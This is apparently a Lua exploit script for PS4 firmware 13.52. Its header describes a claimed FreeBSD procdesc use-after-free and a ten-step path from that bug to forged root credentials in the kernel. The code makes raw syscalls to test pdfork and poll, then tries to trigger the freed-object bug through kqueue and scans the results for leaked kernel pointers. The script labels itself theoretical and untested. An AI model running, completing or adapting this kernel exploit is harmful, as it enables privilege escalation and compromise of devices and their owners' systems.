------------------------------------------------------------
PS4 FW 13.52 - CVE-2026-45251 PROCEDESC UAF EXPLOIT
FreeBSD-SA-26:19.file - poll/select use-after-free

Vulnerability:
  pdfork(2) creates a procdesc with embedded pd_selinfo.
  procdesc_free() does NOT call seldrain() before freeing.
  Two threads block in poll(2) on the procdesc.
  Close procdesc fd → procdesc freed without draining waiters.
  Polling threads timeout → selfdfree() runs on freed memory.

Exploitation:
  1. pdfork() → create procdesc
  2. Two threads poll(2) the procdesc
  3. Close procdesc fd from third thread
  4. SCM_RIGHTS filedescent[2] reclaims the freed procdesc
  5. First timeout → corrupt fc_ioctls pointer
  6. cap_ioctls_get() → leak kernel pointer
  7. cap_ioctls_limit() → free/reclaim with controlled data
  8. Second timeout → controlled kernel pointer write
  9. Write fake ucred into pipe buffer
  10. Set td_ucred = fake root credential

Requirements:
  - pdfork(2) - unprivileged on FreeBSD 13.x
  - poll(2) - unprivileged
  - SCM_RIGHTS - unprivileged
  - pipe for buffer control

Status: Theoretical on PS4 FW 13.52, needs testing
------------------------------------------------------------

function read_qw(addr)
  local b0 = memory.read_byte(addr)
  local b1 = memory.read_byte(addr + 1)
  local b2 = memory.read_byte(addr + 2)
  local b3 = memory.read_byte(addr + 3)
  local b4 = memory.read_byte(addr + 4)
  local b5 = memory.read_byte(addr + 5)
  local b6 = memory.read_byte(addr + 6)
  local b7 = memory.read_byte(addr + 7)
  return b0 + b1*256 + b2*65536 + b3*16777216 + b4*4294967296 + b5*1099511627776 + b6*281474976710656 + b7*72057594037927936
end

local function s(n, a1, a2, a3, a4, a5, a6)
  local stub = syscall_stub[n]
  if not stub then stub = syscall_stub[675] end
  return native.fcall_with_rax(stub + 10, n, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
end

------------------------------------------------------------
-- PHASE 1: Check if pdfork is available
------------------------------------------------------------
function phase1_check_pdfork()
  print("\n=== PHASE 1: Check pdfork ===")

  -- pdfork() - FreeBSD syscall 479
  -- int pdfork(int *fdp)
  -- Creates a process descriptor
  local fdp = memory.alloc(8)
  memory.write_dword(fdp, 0)

  local r = s(479, fdp)
  local pd_fd = memory.read_dword(fdp)

  print(string.format("  pdfork() = %d, pd_fd = %d", r, pd_fd))

  if r == 0 and pd_fd >= 0 and pd_fd < 1024 then
    print("  pdfork AVAILABLE - UAF exploitable!")
    s(6, pd_fd)  -- close the procdesc
    return true
  else
    print("  pdfork NOT available or sandboxed")
    return false
  end
end

------------------------------------------------------------
-- PHASE 2: Check poll(2) on procdesc
------------------------------------------------------------
function phase2_check_poll()
  print("\n=== PHASE 2: Check poll on procdesc ===")

  local fdp = memory.alloc(8)
  local r = s(479, fdp)
  local pd_fd = memory.read_dword(fdp)

  if r ~= 0 or pd_fd < 0 then
    print("  Cannot create procdesc")
    return false
  end

  -- Set up pollfd: {fd=POLLIN|POLLOUT}
  local pollfds = memory.alloc(16)
  memory.write_dword(pollfds, pd_fd)      -- fd
  memory.write_word(pollfds + 4, 0x0003)  -- events: POLLIN|POLLOUT

  -- poll with 1ms timeout (should return immediately)
  local r = s(72, pollfds, 1, 0, 1000)  -- poll(pollfds, 1, 1ms)
  print(string.format("  poll(procdesc) = %d", r))

  if r >= 0 then
    local revents = memory.read_word(pollfds + 6)
    print(string.format("  revents = 0x%x", revents))
  end

  s(6, pd_fd)
  return true
end

------------------------------------------------------------
-- PHASE 3: Thread-based UAF trigger
------------------------------------------------------------
function phase3_uaf_trigger()
  print("\n=== PHASE 3: UAF Trigger ===")
  print("  Strategy: create procdesc, poll from threads, close fd")

  -- This requires multi-threading which may not work in Lua loader
  -- Instead, we'll try sequential approach:
  -- 1. Create procdesc
  -- 2. Register it with kqueue
  -- 3. Close the fd
  -- 4. Check for UAF behavior

  local fdp = memory.alloc(8)
  local r = s(479, fdp)
  local pd_fd = memory.read_dword(fdp)

  if r ~= 0 then
    print("  Cannot create procdesc")
    return false
  end

  print(string.format("  Created procdesc fd=%d", pd_fd))

  -- Create kqueue to monitor procdesc
  local kq = s(362)
  if kq < 0 or kq >= 1024 then
    print("  kqueue failed")
    s(6, pd_fd)
    return false
  end

  -- Register procdesc with kqueue (EVFILT_READ)
  local kev = memory.alloc(64)
  for i = 0, 63 do memory.write_byte(kev + i, 0) end
  memory.write_dword(kev, pd_fd)       -- ident
  memory.write_word(kev + 4, -1)       -- filter: EVFILT_READ (-1)
  memory.write_word(kev + 6, 1)        -- flags: EV_ADD

  r = s(363, kq, kev, 1, 0, 0)
  print(string.format("  kevent register procdesc: ret=%d", r))

  -- Now close the procdesc (free the kernel object)
  print("  Closing procdesc (freeing kernel object)...")
  s(6, pd_fd)

  -- Try to trigger the UAF by kevent
  local events = memory.alloc(4096)
  for i = 0, 4095 do memory.write_byte(events + i, 0) end

  print("  Calling kevent to trigger UAF...")
  r = s(363, kq, events, 100, 0, 0)
  print(string.format("  kevent returned: %d events", r))

  if r > 0 then
    for i = 0, math.min(r - 1, 9) do
      local event = events + i * 32
      local ident = read_qw(event)
      local filter = memory.read_word(event + 8)
      local data = read_qw(event + 16)
      print(string.format("  Event[%d]: ident=0x%x filter=%d data=0x%x", i, ident, filter, data))

      if data >= 0xFFFFFFFF80000000 and data <= 0xFFFFFFFFFFFFFFFF then
        print(string.format("  *** KERNEL PTR: 0x%x ***", data))
      end
    end
  end

  s(6, kq)
  return true
end

------------------------------------------------------------
-- MAIN
------------------------------------------------------------
print("============================================")
print("PS4 FW 13.52 - CVE-2026-45251 PROCEDESC UAF")
print("============================================")

local has_pdfork = phase1_check_pdfork()
if has_pdfork then
  phase2_check_poll()
  phase3_uaf_trigger()
end

print("\n============================================")
print("If pdfork works, this is a critical vuln!")
print("Report pdfork status back to Termux")
print("============================================")
